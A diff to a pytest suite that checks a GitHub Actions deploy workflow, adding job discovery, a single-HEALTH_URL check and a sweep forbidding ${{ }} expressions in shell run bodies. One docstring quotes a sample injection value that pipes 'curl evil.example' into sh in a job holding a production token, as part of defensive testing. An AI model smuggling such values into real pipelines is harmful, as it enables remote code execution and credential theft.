@@ -34,18 +34,64 @@ import pytest
 _WORKFLOW = Path(__file__).resolve().parents[2] / ".github" / "workflows" / "ci.yml"
 _WORKFLOW_TEXT = _WORKFLOW.read_text()
 
+# The roster of deploy jobs this suite knows about, with the /health URL each must reconcile
+# against. Used by the URL-specific test; the *safety* properties below deliberately parametrize
+# over _discover_deploy_jobs() instead, so a job nobody added here is still covered.
+_KNOWN_DEPLOY_JOBS = {
+    "deploy-staging": "https://library-metadata-lookup-staging.up.railway.app/health",
+    "deploy-production": "https://library-metadata-lookup-production.up.railway.app/health",
+}
+
+# Deliberate opt-outs from the reconciliation contract. Empty today; an entry here needs a comment
+# saying why that job may deploy without the LML#1231 verification pair.
+_RECONCILIATION_EXEMPT: dict[str, str] = {}
+
+
+def _discover_deploy_jobs() -> list[str]:
+    """Every top-level job in ci.yml that runs a ``Deploy to Railway`` step.
+
+    A discovery net rather than a hand-written list, following this repo's convention for the
+    shape (``docs/testing.md``, "Meta-test conventions"). The reason it matters here is specific:
+    ``continue-on-error`` on the deploy step means that step no longer fails its job on its own, so
+    a job carrying it and *missing* the reconciliation step would report **green on a failed upload
+    with no verification at all** -- strictly worse than the false red this feature removes, and the
+    one outcome the issue's first constraint forbids. Enumerating the jobs by hand would leave a
+    third deploy job silently outside every guard below.
+    """
+    lines = _WORKFLOW_TEXT.splitlines()
+    jobs, current = [], None
+    for line in lines:
+        top_level = re.match(r"^  ([A-Za-z0-9_-]+):\s*$", line)
+        if top_level:
+            current = top_level.group(1)
+        elif current and line.lstrip().startswith("- name:") and "Deploy to Railway" in line:
+            if current not in jobs:
+                jobs.append(current)
+    return [j for j in jobs if j not in _RECONCILIATION_EXEMPT]
+
+
 _JOBS = [
-    pytest.param(
-        "deploy-staging",
-        "https://library-metadata-lookup-staging.up.railway.app/health",
-        id="staging",
-    ),
-    pytest.param(
-        "deploy-production",
-        "https://library-metadata-lookup-production.up.railway.app/health",
-        id="production",
-    ),
+    pytest.param(name, url, id=name.removeprefix("deploy-"))
+    for name, url in _KNOWN_DEPLOY_JOBS.items()
 ]
+_JOB_NAMES = _discover_deploy_jobs()
+
+
+def test_discovery_finds_the_known_deploy_jobs():
+    """Vacuity guard: if the sweep's pattern drifts it must fail loudly, never silently match
+    nothing and pass every parametrized safety test below by having no cases to run."""
+    assert set(_KNOWN_DEPLOY_JOBS) <= set(_JOB_NAMES), (
+        f"sweep found {_JOB_NAMES}, which does not cover the known deploy jobs "
+        f"{sorted(_KNOWN_DEPLOY_JOBS)} -- the discovery pattern has drifted"
+    )
+
+
+def test_the_known_job_roster_has_no_stale_entries():
+    """Reverse/stale check: a roster entry naming a job that no longer exists makes the roster a
+    misleading map, and would quietly stop pinning the URL it claims to pin."""
+    discovered = set(_discover_deploy_jobs()) | set(_RECONCILIATION_EXEMPT)
+    stale = sorted(set(_KNOWN_DEPLOY_JOBS) - discovered)
+    assert not stale, f"roster names jobs that are no longer in ci.yml: {stale}"
 
 
 def _job_block(job_name: str) -> str:
@@ -98,14 +144,30 @@ def test_health_is_sampled_before_railway_up_runs(job_name, health_url):
 
     sample_step = _step_block(job, "Sample /health before upload")
     assert "scripts/sample_health_commit_sha.sh" in sample_step
-    assert health_url in sample_step
     assert re.search(r"^\s*id:\s*pre_deploy_health\s*$", sample_step, re.M), (
         "the sample step needs an id so the reconciliation step can reference its output"
     )
 
 
 @pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_deploy_step_does_not_hard_fail_the_job_on_its_own(job_name, health_url):
+def test_each_job_defines_its_health_url_exactly_once(job_name, health_url):
+    """One definition per job, at job level, read by both the sample and reconcile steps.
+
+    Spelling the URL twice per job -- once in each step's own ``env:`` -- would be two literals
+    that must agree, and the failure when they don't is silent and bad: reconciling a *production*
+    deploy against *staging*'s /health would compare the wrong service's SHA and could report a
+    production deploy recovered on the strength of a staging transition."""
+    job = _job_block(job_name)
+    definitions = re.findall(r"^\s*HEALTH_URL:\s*(\S+)\s*$", job, re.M)
+
+    assert definitions == [health_url], (
+        f"{job_name} defines HEALTH_URL {len(definitions)} time(s) as {definitions}; "
+        f"expected exactly one, equal to {health_url}"
+    )
+
+
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_deploy_step_does_not_hard_fail_the_job_on_its_own(job_name):
     """continue-on-error is what makes a later step able to decide red/green at all: once a step
     fails outright, no later step's success can undo that job-level failure in GitHub Actions."""
     job = _job_block(job_name)
@@ -115,8 +177,8 @@ def test_deploy_step_does_not_hard_fail_the_job_on_its_own(job_name, health_url)
     assert re.search(r"^\s*id:\s*deploy\s*$", deploy_step, re.M)
 
 
-@pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_wait_step_only_runs_when_a_deployment_id_exists(job_name, health_url):
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_wait_step_only_runs_when_a_deployment_id_exists(job_name):
     job = _job_block(job_name)
     wait_step = _step_block(job, "Wait for deployment to go live")
 
@@ -125,8 +187,8 @@ def test_wait_step_only_runs_when_a_deployment_id_exists(job_name, health_url):
     )
 
 
-@pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_reconciliation_step_only_runs_when_no_deployment_id_exists(job_name, health_url):
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_reconciliation_step_only_runs_when_no_deployment_id_exists(job_name):
     job = _job_block(job_name)
     reconcile_step = _step_block(job, "Reconcile deploy with no deployment id")
 
@@ -134,51 +196,44 @@ def test_reconciliation_step_only_runs_when_no_deployment_id_exists(job_name, he
         r"^\s*if:\s*steps\.deploy\.outputs\.deployment_id\s*==\s*''\s*$", reconcile_step, re.M
     )
     assert "scripts/reconcile_deploy_via_health.sh" in reconcile_step
-    assert health_url in reconcile_step
     assert "github.sha" in reconcile_step
     assert "steps.pre_deploy_health.outputs.commit_sha" in reconcile_step
 
 
-@pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_no_deploy_step_interpolates_an_expression_into_its_shell_script(job_name, health_url):
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_no_deploy_step_interpolates_an_expression_into_its_shell_script(job_name):
     """``${{ }}`` in a ``run:`` body is textual substitution *before* the shell sees the script,
     so any expression whose value isn't fully under our control is a script-injection sink.
 
-    ``steps.pre_deploy_health.outputs.commit_sha`` is exactly such a value: it is whatever
-    ``jq`` pulled out of a **remote HTTP response body** from ``/health``. Interpolated into
-    ``run:``, a ``commit_sha`` of ``"; curl evil.example | sh #`` would execute -- in a job that
-    holds ``RAILWAY_TOKEN_PRODUCTION``. And the reachability argument is the wrong way round from
-    the usual "but it's our own service": this step runs *only* when the deploy infrastructure is
-    already misbehaving, which is precisely when the endpoint's output is least trustworthy.
+    ``steps.pre_deploy_health.outputs.commit_sha`` is exactly such a value: it is whatever ``jq``
+    pulled out of a **remote HTTP response body** from ``/health``. Interpolated into ``run:``, a
+    ``commit_sha`` of ``"; curl evil.example | sh #`` would execute -- in a job that holds
+    ``RAILWAY_TOKEN_PRODUCTION``. And the reachability argument runs the opposite way from the
+    usual "but it's our own service": this path runs *only* when the deploy infrastructure is
+    already misbehaving, which is precisely when that endpoint's output is least trustworthy.
 
-    The documented mitigation is indirection through ``env:`` -- the expression is expanded into
-    an environment variable's value, which the shell then reads as data rather than parsing as
-    source. So no ``run:`` body in these jobs may contain an expression at all, including the
-    ones (like ``github.sha``) that happen to be safe today: an all-or-nothing rule is the only
-    kind a reviewer can check at a glance, and it doesn't rot when a step gains an argument.
-    """
+    The mitigation is indirection through ``env:``, where the value reaches the shell as data
+    rather than as source text. This sweeps **every** step in the job rather than a named list,
+    including ones whose expression is safe today like ``github.sha``: the justification for the
+    rule is that a reviewer can check it at a glance, and that is only true of a property with no
+    exceptions to remember. A named list would also leave a step added tomorrow unguarded."""
     job = _job_block(job_name)
-    for step_name in (
-        "Sample /health before upload",
-        "Deploy to Railway",
-        "Wait for deployment to go live",
-        "Reconcile deploy with no deployment id",
-    ):
+    offenders = []
+    for step_name in re.findall(r"^\s*- name:\s*(.+?)\s*$", job, re.M):
         step = _step_block(job, step_name)
-        # The `run:` body is everything from the `run:` key up to the sibling `env:` key.
         run_body = re.search(r"^(\s*)run:(.*?)(?=^\1env:|\Z)", step, re.M | re.S)
-        assert run_body is not None, f"{step_name!r} has no `run:` body"
-        assert "${{" not in run_body.group(2), (
-            f"{step_name!r} interpolates a workflow expression directly into its shell script. "
-            "Pass it through `env:` and reference it as a shell variable instead, so the value "
-            "reaches the shell as data rather than as source text."
-        )
+        if run_body and "${{" in run_body.group(2):
+            offenders.append(step_name)
+
+    assert not offenders, (
+        f"steps {offenders} interpolate a workflow expression directly into a shell script. "
+        "Pass the value through `env:` and reference it as a shell variable instead, so it "
+        "reaches the shell as data rather than as source text."
+    )
 
 
-@pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_the_two_gated_steps_are_exhaustive_so_a_failed_deploy_cannot_report_green(
-    job_name, health_url
-):
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_the_two_gated_steps_are_exhaustive_so_a_failed_deploy_cannot_report_green(job_name):
     """The safety property that ``continue-on-error`` on the deploy step buys its keep with.
 
     Masking that step's failure means it no longer fails the job by itself, so the job's whole
@@ -233,8 +288,8 @@ def test_the_two_gated_steps_are_exhaustive_so_a_failed_deploy_cannot_report_gre
     assert wait_if.replace("!=", "==") == reconcile_if
 
 
-@pytest.mark.parametrize("job_name,health_url", _JOBS)
-def test_reconciliation_step_runs_after_the_wait_step(job_name, health_url):
+@pytest.mark.parametrize("job_name", _JOB_NAMES)
+def test_reconciliation_step_runs_after_the_wait_step(job_name):
     """Ordering doesn't change which one actually executes (their `if`s are mutually exclusive
     on deployment_id), but keeping the reconciliation path textually after the normal wait path
     keeps the job's step list reading like the two branches of one decision."""
